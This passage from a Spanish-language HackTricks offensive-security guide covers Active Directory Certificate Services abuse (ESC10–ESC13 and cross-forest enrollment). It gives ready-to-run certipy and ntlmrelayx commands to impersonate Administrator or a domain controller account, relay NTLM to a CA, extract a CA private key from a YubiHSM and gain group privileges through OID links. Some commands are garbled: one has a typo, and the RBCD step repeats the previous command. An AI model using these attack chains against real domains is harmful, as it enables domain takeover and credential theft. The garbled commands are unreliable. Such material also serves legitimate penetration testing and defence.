### Explicación

Dos valores de clave de registro en el controlador de dominio son referidos por ESC10:

* El valor predeterminado para `CertificateMappingMethods` bajo `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` es `0x18` (`0x8 | 0x10`), anteriormente establecido en `0x1F`.
* La configuración predeterminada para `StrongCertificateBindingEnforcement` bajo `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` es `1`, anteriormente `0`.

**Caso 1**

Cuando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Caso 2**

Si `CertificateMappingMethods` incluye el bit `UPN` (`0x4`).

### Caso de Abuso 1

Con `StrongCertificateBindingEnforcement` configurado como `0`, una cuenta A con permisos de `GenericWrite` puede ser explotada para comprometer cualquier cuenta B.

Por ejemplo, teniendo permisos de `GenericWrite` sobre `Jane@corp.local`, un atacante apunta a comprometer `Administrator@corp.local`. El procedimiento refleja ESC9, permitiendo que se utilice cualquier plantilla de certificado.

Inicialmente, se recupera el hash de `Jane` utilizando Credenciales en Sombra, explotando el `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo deliberadamente la parte `@corp.local` para evitar una violación de restricción.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Siguiendo esto, se solicita un certificado que habilite la autenticación del cliente como `Jane`, utilizando la plantilla predeterminada de `Usuario`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` de `Jane` se revierte a su valor original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autenticarse con el certificado obtenido producirá el hash NT de `Administrator@corp.local`, siendo necesario especificar el dominio en el comando debido a la ausencia de detalles del dominio en el certificado.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de abuso 2

Con el `CertificateMappingMethods` que contiene el bit de bandera `UPN` (`0x4`), una cuenta A con permisos de `GenericWrite` puede comprometer cualquier cuenta B que carezca de una propiedad `userPrincipalName`, incluidas las cuentas de máquinas y el administrador de dominio integrado `Administrator`.

Aquí, el objetivo es comprometer `DC$@corp.local`, comenzando con la obtención del hash de `Jane` a través de Credenciales de Sombra, aprovechando el `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` de `Jane` se establece como `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Un certificado para autenticación de cliente es solicitado como `Jane` utilizando la plantilla predeterminada de `Usuario`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` de `Jane` se revierte a su valor original después de este proceso.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticar a través de Schannel, se utiliza la opción `-ldap-shell` de Certipy, indicando el éxito de la autenticación como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
A través del shell LDAP, comandos como `set_rbcd` habilitan ataques de Delegación Constrained basada en Recursos (RBCD), comprometiendo potencialmente el controlador de dominio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Esta vulnerabilidad también se extiende a cualquier cuenta de usuario que carezca de un `userPrincipalName` o donde no coincida con el `sAMAccountName`, siendo el `Administrator@corp.local` predeterminado un objetivo principal debido a sus privilegios LDAP elevados y la ausencia de un `userPrincipalName` de forma predeterminada.

## Reenvío de NTLM a ICPR - ESC11

### Explicación

Si el servidor de CA no está configurado con `IF_ENFORCEENCRYPTICERTREQUEST`, puede realizar ataques de reenvío de NTLM sin firmar a través del servicio RPC. [Referencia aquí](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Puedes usar `certipy` para enumerar si `Enforce Encryption for Requests` está deshabilitado y certipy mostrará las vulnerabilidades `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Escenario de abuso

Es necesario configurar un servidor de retransmisión:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para controladores de dominio, debemos especificar `-template` en DomainController.

O utilizando [la bifurcación de sploutchy de impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Acceso al shell a ADCS CA con YubiHSM - ESC12

### Explicación

Los administradores pueden configurar la Autoridad de Certificación para almacenarla en un dispositivo externo como el "Yubico YubiHSM2".

Si el dispositivo USB está conectado al servidor de CA a través de un puerto USB, o un servidor de dispositivo USB en caso de que el servidor de CA sea una máquina virtual, se requiere una clave de autenticación (a veces denominada "contraseña") para que el Proveedor de Almacenamiento de Claves genere y utilice claves en el YubiHSM.

Esta clave/contraseña se almacena en el registro en `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` en texto claro.

Referencia en [aquí](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Escenario de abuso

Si la clave privada de la CA se almacena en un dispositivo USB físico cuando se tiene acceso al shell, es posible recuperar la clave.

En primer lugar, es necesario obtener el certificado de la CA (este es público) y luego:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
## Abuso de Vínculo de Grupo OID - ESC13

### Explicación

El atributo `msPKI-Certificate-Policy` permite que la política de emisión se agregue a la plantilla de certificado. Los objetos `msPKI-Enterprise-Oid` que son responsables de emitir políticas se pueden descubrir en el Contexto de Nombres de Configuración (CN=OID,CN=Public Key Services,CN=Services) del contenedor OID de PKI. Una política puede estar vinculada a un grupo de AD utilizando el atributo `msDS-OIDToGroupLink` de este objeto, lo que permite a un sistema autorizar a un usuario que presente el certificado como si fuera miembro del grupo. [Referencia aquí](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

En otras palabras, cuando un usuario tiene permiso para inscribir un certificado y el certificado está vinculado a un grupo OID, el usuario puede heredar los privilegios de este grupo.

Utiliza [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Escenario de Abuso

Encuentra un permiso de usuario que pueda usar `certipy find` o `Certify.exe find /showAllPermissions`.

Si `John` tiene permiso para inscribirse en `VulnerableTemplate`, el usuario puede heredar los privilegios del grupo `VulnerableGroup`.

Todo lo que necesita hacer es especificar la plantilla, obtendrá un certificado con derechos de OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Comprometiendo Bosques con Certificados Explicado en Voz Pasiva

### Ruptura de Confianza de Bosques por CAs Comprometidos

La configuración para la **inscripción entre bosques** se realiza de manera relativamente sencilla. El **certificado de la CA raíz** del bosque de recursos es **publicado en los bosques de cuentas** por los administradores, y los certificados de **CA empresarial** del bosque de recursos son **agregados a los contenedores `NTAuthCertificates` y AIA en cada bosque de cuentas**. Para aclarar, este arreglo otorga a la **CA en el bosque de recursos control completo** sobre todos los demás bosques para los cuales administra PKI. Si esta CA es **comprometida por atacantes**, los certificados de todos los usuarios en ambos bosques de recursos y de cuentas podrían ser **falsificados por ellos**, rompiendo así el límite de seguridad del bosque.

### Privilegios de Inscripción Concedidos a Principales Extranjeros

En entornos multi-bosque, se requiere precaución con respecto a las CAs empresariales que **publican plantillas de certificados** que permiten a **Usuarios Autenticados o principales extranjeros** (usuarios/grupos externos al bosque al que pertenece la CA empresarial) **derechos de inscripción y edición**.\
Al autenticarse a través de una confianza, el **SID de Usuarios Autenticados** es agregado al token del usuario por AD. Por lo tanto, si un dominio posee una CA empresarial con una plantilla que **permite derechos de inscripción a Usuarios Autenticados**, una plantilla podría potencialmente ser **inscrita por un usuario de un bosque diferente**. De igual manera, si **se conceden explícitamente derechos de inscripción a un principal extranjero por una plantilla**, se crea una **relación de control de acceso entre bosques**, permitiendo a un principal de un bosque **inscribirse en una plantilla de otro bosque**.

Ambos escenarios conducen a un **aumento en la superficie de ataque** de un bosque a otro. La configuración de la plantilla de certificado podría ser explotada por un atacante para obtener privilegios adicionales en un dominio extranjero.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**oficial mercancía de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
